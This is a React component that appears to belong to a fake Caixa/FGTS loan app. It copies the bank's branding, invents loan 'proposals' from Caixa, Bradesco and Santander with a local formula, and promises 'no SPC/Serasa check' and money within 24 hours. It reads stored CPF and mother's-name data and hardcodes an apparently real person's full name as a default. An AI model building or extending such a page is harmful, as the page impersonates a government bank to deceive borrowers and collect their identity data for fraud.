import React, { useState, useEffect } from 'react';
import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal, Check, Info } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useNavigate, useLocation } from 'react-router-dom';
import { useIsMobile } from '@/hooks/use-mobile';
import { Checkbox } from '@/components/ui/checkbox';

interface LoanProposal {
  id: number;
  installmentsCount: number;
  installmentValue: number;
  totalAmount: number;
  interestRate: number;
  selected: boolean;
  bankLogo: string;
  bankName: string;
}

interface UserData {
  DADOS: {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
  }
}

const LoanDetails = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [requestedAmount, setRequestedAmount] = useState('');
  const [desiredInstallment, setDesiredInstallment] = useState('');
  const [hasConsulted, setHasConsulted] = useState(false);
  const [userName, setUserName] = useState('');
  const [userCPF, setUserCPF] = useState('');
  
  const monthlyInterestRate = 0.018;
  
  const [loanProposals, setLoanProposals] = useState<LoanProposal[]>([]);
  
  useEffect(() => {
    // Try to get user data from localStorage
    const userDataString = localStorage.getItem('userData');
    
    if (userDataString) {
      try {
        const parsedData: UserData = JSON.parse(userDataString);
        setUserName(parsedData.DADOS.nome);
        setUserCPF(parsedData.DADOS.cpf);
      } catch (error) {
        console.error("Error parsing user data:", error);
        // Use default name if error occurs
        setUserName('JUAREZ JOSE FERNANDES DE FREITAS');
      }
    } else {
      // No user data available, use default
      setUserName('JUAREZ JOSE FERNANDES DE FREITAS');
    }
  }, []);
  
  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value === '') {
      setRequestedAmount('');
      return;
    }
    
    const numberValue = parseInt(value, 10) / 100;
    setRequestedAmount(formatCurrency(numberValue).replace('R$', '').trim());
  };
  
  const handleInstallmentChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value === '') {
      setDesiredInstallment('');
      return;
    }
    
    const numberValue = parseInt(value, 10) / 100;
    setDesiredInstallment(formatCurrency(numberValue).replace('R$', '').trim());
  };
  
  const handleConsult = () => {
    if (!requestedAmount || !desiredInstallment) return;
    
    const requestedAmountValue = parseFloat(requestedAmount.replace(/\./g, '').replace(',', '.'));
    const maxLoanAmount = 10000;
    
    const amount = Math.min(requestedAmountValue, maxLoanAmount);
    
    if (requestedAmountValue > maxLoanAmount) {
      console.log("Requested amount exceeded maximum, limiting to R$ 10,000");
    }
    
    const installment = parseFloat(desiredInstallment.replace(/\./g, '').replace(',', '.'));
    
    const proposal1 = {
      id: 1,
      totalAmount: amount * 0.95,
      installmentsCount: 60,
      installmentValue: (amount * 0.95 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                        (Math.pow(1 + monthlyInterestRate, 60) - 1),
      interestRate: monthlyInterestRate,
      selected: true,
      bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
      bankName: "Caixa Econômica Federal"
    };
    
    const proposal2 = {
      id: 2,
      totalAmount: amount * 1.10,
      installmentsCount: 60,
      installmentValue: (amount * 1.10 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                        (Math.pow(1 + monthlyInterestRate, 60) - 1),
      interestRate: monthlyInterestRate,
      selected: false,
      bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Banco_Bradesco_logo_%28horizontal%29.png/1200px-Banco_Bradesco_logo_%28horizontal%29.png",
      bankName: "Bradesco"
    };
    
    const proposal3 = {
      id: 3,
      totalAmount: amount * 1.23,
      installmentsCount: 60,
      installmentValue: (amount * 1.23 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                        (Math.pow(1 + monthlyInterestRate, 60) - 1),
      interestRate: monthlyInterestRate,
      selected: false,
      bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/1200px-Banco_Santander_Logotipo.svg.png",
      bankName: "Santander"
    };
    
    setLoanProposals([proposal1, proposal2, proposal3]);
    setHasConsulted(true);
  };
  
  const handleSelectProposal = (id: number) => {
    setLoanProposals(prevProposals => 
      prevProposals.map(proposal => ({
        ...proposal,
        selected: proposal.id === id
      }))
    );
  };
  
  const formatCurrency = (value: number): string => {
    return value.toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  };
  
  const selectedProposal = loanProposals.find(p => p.selected) || loanProposals[0];
  
  const handleProceed = () => {
    const selectedProposal = loanProposals.find(p => p.selected) || loanProposals[0];
    navigate('/loan-processing', { 
      state: { 
        ...selectedProposal,
        userName
      } 
    });
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-28' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8 w-28' : 'h-10'}`} />
      </div>

      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Simulação de Empréstimo</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Descubra as melhores opções para você
        </div>
      </div>

      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6">
          {!hasConsulted ? (
            <div className="mb-6">
              <h2 className="text-[#005CA9] text-xl font-semibold mb-4">Simule seu empréstimo</h2>
              
              <div className="space-y-4 mb-6">
                <div>
                  <label htmlFor="requestedAmount" className="block text-sm font-medium text-gray-700 mb-1">
                    De quanto você precisa?
                  </label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">R$</span>
                    <Input
                      id="requestedAmount"
                      type="text"
                      className="pl-8"
                      value={requestedAmount}
                      onChange={handleAmountChange}
                      placeholder="0,00"
                    />
                  </div>
                </div>
                
                <div>
                  <label htmlFor="desiredInstallment" className="block text-sm font-medium text-gray-700 mb-1">
                    Quanto você pode pagar por mês?
                  </label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">R$</span>
                    <Input
                      id="desiredInstallment"
                      type="text"
                      className="pl-8"
                      value={desiredInstallment}
                      onChange={handleInstallmentChange}
                      placeholder="0,00"
                    />
                  </div>
                </div>
              </div>
              
              <Button 
                className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full"
                onClick={handleConsult}
                disabled={!requestedAmount || !desiredInstallment}
              >
                CONSULTAR
              </Button>
            </div>
          ) : (
            <>
              <div className="mb-6">
                <h2 className="text-[#005CA9] text-xl font-semibold">Olá, {userName}</h2>
                <p className="text-gray-600 text-sm mt-1">
                  Confira as opções de empréstimo disponíveis para você
                </p>
              </div>
              
              <div className="mb-6">
                <h2 className="text-[#005CA9] text-lg font-semibold mb-4">Propostas Disponíveis</h2>
                
                <div className="space-y-4">
                  {loanProposals.map((proposal) => (
                    <div 
                      key={proposal.id}
                      className={`border rounded-lg p-4 cursor-pointer transition-all ${
                        proposal.selected 
                          ? 'border-[#005CA9] bg-blue-50' 
                          : 'border-gray-200 hover:border-gray-300'
                      }`}
                      onClick={() => handleSelectProposal(proposal.id)}
                    >
                      <div className="flex items-start justify-between">
                        <div className="flex-1">
                          <div className="font-semibold text-lg">
                            {proposal.installmentsCount}x de {formatCurrency(proposal.installmentValue)}
                          </div>
                          <div className="text-sm text-gray-600 mt-1">
                            Valor total: {formatCurrency(proposal.totalAmount)}
                          </div>
                          <div className="h-6 mt-2">
                            <img 
                              src={proposal.bankLogo} 
                              alt={proposal.bankName} 
                              className="h-full object-contain"
                            />
                          </div>
                        </div>
                        <div className={`w-6 h-6 flex-shrink-0 rounded-full border flex items-center justify-center ${
                          proposal.selected 
                            ? 'border-[#005CA9] bg-[#005CA9]' 
                            : 'border-gray-300'
                        }`}>
                          {proposal.selected && <Check size={16} className="text-white" />}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {selectedProposal && (
                <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                    <div>
                      <div className="text-gray-500 text-sm">Valor do empréstimo</div>
                      <div className="font-medium text-gray-900 text-xl">
                        {formatCurrency(selectedProposal.totalAmount)}
                      </div>
                    </div>
                    <div>
                      <div className="text-gray-500 text-sm">Parcelas</div>
                      <div className="font-medium text-gray-900 text-xl">
                        {selectedProposal.installmentsCount}x de {formatCurrency(selectedProposal.installmentValue)}
                      </div>
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                    <div>
                      <div className="text-gray-500 text-sm">Valor total a ser pago</div>
                      <div className="font-medium text-gray-900 text-xl">
                        {formatCurrency(selectedProposal.installmentValue * selectedProposal.installmentsCount)}
                      </div>
                    </div>
                    <div>
                      <div className="text-gray-500 text-sm">Taxa de referência</div>
                      <div className="font-medium text-blue-600 text-xl">{(selectedProposal.interestRate * 100).toFixed(2)}% ao mês</div>
                    </div>
                  </div>
                  
                  <div className="bg-blue-50 p-4 rounded-md mb-4 flex">
                    <Info className="text-blue-700 mr-3 flex-shrink-0 mt-1" size={20} />
                    <div className="text-blue-800 text-sm">
                      Os valores desta simulação consideram a taxa média de juros do consignado privado. Você não precisa ser correntista do banco para contratar o empréstimo, ele será apenas intermediário da operação.
                    </div>
                  </div>
                  
                  <div className="bg-yellow-50 p-4 rounded-md mb-6 flex">
                    <Info className="text-yellow-700 mr-3 flex-shrink-0 mt-1" size={20} />
                    <div className="text-yellow-800 text-sm">
                      Não é necessário ser correntista do banco para contratar este empréstimo. O banco atua apenas como intermediário da operação.
                    </div>
                  </div>
                  
                  <div className="flex items-start space-x-3 mb-6">
                    <Checkbox 
                      id="terms" 
                      checked={termsAccepted}
                      onCheckedChange={() => setTermsAccepted(!termsAccepted)}
                      className="mt-1"
                    />
                    <div>
                      <label htmlFor="terms" className="text-gray-700 text-sm cursor-pointer">
                        Concordo em compartilhar meus dados trabalhistas e financeiros com as instituições financeiras parceiras.
                      </label>
                      <div className="mt-1">
                        <span className="text-blue-600 text-sm cursor-pointer">Quais dados serão compartilhados?</span>
                      </div>
                    </div>
                  </div>
                  
                  <Button 
                    className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full"
                    onClick={handleProceed}
                    disabled={!termsAccepted}
                  >
                    CONTRATAR EMPRÉSTIMO
                  </Button>
                </div>
              )}
              
              <div className="mb-20">
                <div className="text-[#005CA9] font-semibold mb-3">Vantagens</div>
                <div className="flex items-start space-x-2 mb-2">
                  <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
                  <span className="text-sm text-gray-600">Crédito fácil e rápido</span>
                </div>
                <div className="flex items-start space-x-2 mb-2">
                  <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
                  <span className="text-sm text-gray-600">Sem consulta ao SPC/Serasa</span>
                </div>
                <div className="flex items-start space-x-2">
                  <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
                  <span className="text-sm text-gray-600">Dinheiro na conta em até 24 horas</span>
                </div>
              </div>
            </>
          )}
        </div>
        
        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanDetails;
